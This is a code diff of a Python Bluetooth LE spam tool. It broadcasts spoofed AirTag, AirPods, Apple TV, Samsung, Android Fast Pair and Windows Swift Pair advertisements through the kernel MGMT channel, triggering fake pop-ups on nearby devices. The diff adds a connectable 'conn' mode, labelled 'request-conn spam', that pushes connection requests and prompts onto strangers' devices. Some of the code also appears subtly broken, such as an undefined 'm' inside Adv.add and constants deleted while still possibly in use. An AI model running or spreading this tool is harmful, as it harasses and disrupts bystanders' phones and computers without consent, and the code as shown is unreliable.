@@ -1,13 +1,14 @@
 #!/usr/bin/env python3
 # xcut-ble-raw - BLE advertiser via the kernel MGMT control channel.
-# Use is: on <mode> [arg] | off | check
+# Use is: on <mode> [arg] | conn [mode] [arg] | off | check
 #   modes: airtag|airpods|appletv|homepod|samsung|
 #          android <name>|windows <text>|ibeacon|all
+#   conn: like "on" but CONNECTABLE (ADV_IND) so nearby centrals send
+#         connection requests / get prompted to connect (request-conn spam)
 # Uses local BT adapter hci0 (index 0). No bluetoothd needed, but it may
 # run alongside it.
 import ctypes
 import os
-import random
 import signal
 import socket
 import struct
@@ -36,12 +37,6 @@ def bind_control(sock, dev=None):
         err = ctypes.get_errno()
         raise OSError(err, f"control bind failed ({os.strerror(err)})")
 
-AF_BLUETOOTH = 31
-SOL_HCI = 0
-BTPROTO_HCI = 1
-HCI_CHANNEL = 4
-HCI_CHANNEL_CONTROL = 3
-
 HCI_DEV_NONE = 0xFFFF
 MGMT_INDEX_NONE = 0xFFFF
 MGMT_OP_READ_INDEX_LIST = 0x0003
@@ -56,6 +51,8 @@ MGMT_EV_CMD_STATUS = 0x0002
 MGMT_EV_ADVERTISING_ADDED = 0x0023
 MGMT_EV_ADVERTISING_REMOVED = 0x0024
 
+MGMT_ADV_FLAG_CONNECTABLE = 1 << 0
+MGMT_ADV_FLAG_LEGACY = 1 << 6
 MGMT_ADV_FLAG_SEC_1M = 1 << 7
 
 STATUS = {0: "success", 1: "unknown-cmd", 2: "not-connected", 3: "failed",
@@ -115,9 +112,11 @@ def index_list(m):
     if not r or r[0] != 0:
         return []
     body = r[1]
-    if len(body) < 2:
+    if len(body) < struct.calcsize("<H"):
         return []
     cnt = struct.unpack("<H", body[:2])[0]
+    if len(body) < 2 + cnt * 2:
+        return []
     return list(struct.unpack(f"<{cnt}H", body[2:2 + cnt * 2]))
 
 
@@ -126,10 +125,15 @@ def adv_features(m):
     if not r or r[0] != 0:
         return {}
     b = r[1]
+    if len(b) < 8:
+        return {}
+    num_inst = b[7]
+    if len(b) < 8 + num_inst:
+        return {}
     return {"flags": struct.unpack("<I", b[0:4])[0],
             "max_adv": b[4], "max_scan": b[5],
-            "max_inst": b[6], "num_inst": b[7],
-            "instances": list(b[8:8 + b[7]])}
+            "max_inst": b[6], "num_inst": num_inst,
+            "instances": list(b[8:8 + num_inst])}
 
 
 def add_legacy(m, inst, data, flags=0):
@@ -157,25 +161,32 @@ def add_ext(m, inst, data, flags=0):
 
 
 class Adv:
-    def __init__(self):
+    def __init__(self, connectable=False):
         self.instances = []
         self.ext = False
         self._next = 1
+        self.connectable = connectable
 
     def add(self, payload):
         inst = self._next
         self._next += 1
         data = bytes([len(payload)]) + payload
-        wire, err = add_legacy(m, inst, data)
+        legacy_flags = 0
+        ext_flags = 0
+        if self.connectable:
+            legacy_flags = MGMT_ADV_FLAG_CONNECTABLE | MGMT_ADV_FLAG_LEGACY
+            ext_flags = MGMT_ADV_FLAG_CONNECTABLE
+        wire, err = add_legacy(m, inst, data, legacy_flags)
         if wire is None:
-            wire, err = add_ext(m, inst, data)
+            wire, err = add_ext(m, inst, data, ext_flags)
             if wire is not None:
                 self.ext = True
         if wire is None:
             print(f"  add failed ({err or 'no reply'})")
             return
+        kind = 'conn' if self.connectable else 'adv'
         self.instances.append(wire)
-        print(f"  adv instance {wire} {'ext' if self.ext else 'legacy'} data {len(payload)+1}b")
+        print(f"  {kind} instance {wire} {'ext' if self.ext else 'legacy'} data {len(payload)+1}b")
 
     def remove(self):
         for i in self.instances:
@@ -222,7 +233,8 @@ def ibeacon():
 
 
 def findmy():
-    return bytes([0x1E, 0xFF, 0x00, 0x4C, 0x12, 0x19, 0x10]) + random.randbytes(24)
+    # os.urandom works on Python 3.8+; random.randbytes only exists on 3.9+
+    return bytes([0x1E, 0xFF, 0x00, 0x4C, 0x12, 0x19, 0x10]) + os.urandom(24)
 
 
 def payloads(mode, extra):
@@ -245,7 +257,7 @@ def payloads(mode, extra):
     if mode == "all":
         return ([apple(v) for v in APPLE.values() if v.startswith("0719")] +
                 [samsung(), windows(), fp2("google")])
-    raise ValueError(mode)
+    raise ValueError(f"unknown mode: {mode!r}")
 
 
 def run_burst(m, adv, payload, cap, delay=0.04):
@@ -275,14 +287,20 @@ def main():
     m = Mgmt(0)
     ids = index_list(m)
     print(f"mgmt up  index {m.dev}  controllers: {ids or 'none'}")
-    feat = adv_features(m)
+    try:
+        feat = adv_features(m)
+    except OSError as e:
+        if os.geteuid() != 0:
+            print(f"adv features error: {e} (kernel butuh root - jalankan via sudo xcut-ble)")
+            sys.exit(1)
+        raise
     print(f"adv features: flags=0x{feat.get('flags',0):08x} inst={feat.get('max_inst')}"
           f" used={feat.get('num_inst')} max_adv={feat.get('max_adv')}")
     adv = Adv()
     cmd = sys.argv[1]
     cap = max(1, min(feat.get("max_inst", 12), 12))
     if cmd == "burst":
-        mode = sys.argv[2] if len(sys.argv) > 2 else "all"
+        mode = sys.argv[2] if len(sys.argv) > 2 and sys.argv[2] else "all"
         extra = sys.argv[3] if len(sys.argv) > 3 else ""
         pool = payloads(mode, extra)
         if mode == "airtag":
@@ -292,19 +310,34 @@ def main():
         run_burst(m, adv, pool, cap)
         return
     if cmd == "off":
-        r = m.send(MGMT_OP_READ_ADV_FEATURES)
-        if r and r[0] == 0:
-            insts = list(r[1][8:8 + r[1][7]])
-            for i in insts:
-                m.send(MGMT_OP_REMOVE_ADVERTISING, struct.pack("B", i))
-            print("removed", len(insts), "instance(s)")
+        feat = adv_features(m)
+        for i in feat.get("instances", []):
+            m.send(MGMT_OP_REMOVE_ADVERTISING, struct.pack("B", i))
+        print("removed", len(feat.get("instances", [])), "instance(s)")
         return
     if cmd == "check":
+        return
+    if cmd == "conn":
+        mode = sys.argv[2] if len(sys.argv) > 2 and sys.argv[2] else "all"
+        extra = sys.argv[3] if len(sys.argv) > 3 else ""
+        items = payloads(mode, extra)
+        adv = Adv(connectable=True)
+        for p in items[:cap]:
+            adv.add(p)
+        print(f"connectable broadcasting {len(items)} payload(s) (ADV_IND); Ctrl-C to stop")
+        try:
+            while True:
+                time.sleep(1)
+        except KeyboardInterrupt:
+            pass
+        finally:
+            adv.remove()
+            print("instances removed")
         return
     if cmd != "on":
         print(__doc__)
         sys.exit(2)
-    mode = sys.argv[2] if len(sys.argv) > 2 else "airpods"
+    mode = sys.argv[2] if len(sys.argv) > 2 and sys.argv[2] else "airpods"
     extra = sys.argv[3] if len(sys.argv) > 3 else ""
     items = payloads(mode, extra)
     for p in items[:cap]:
@@ -320,4 +353,5 @@ def main():
         print("instances removed")
 
 
-main()
+if __name__ == "__main__":
+    main()
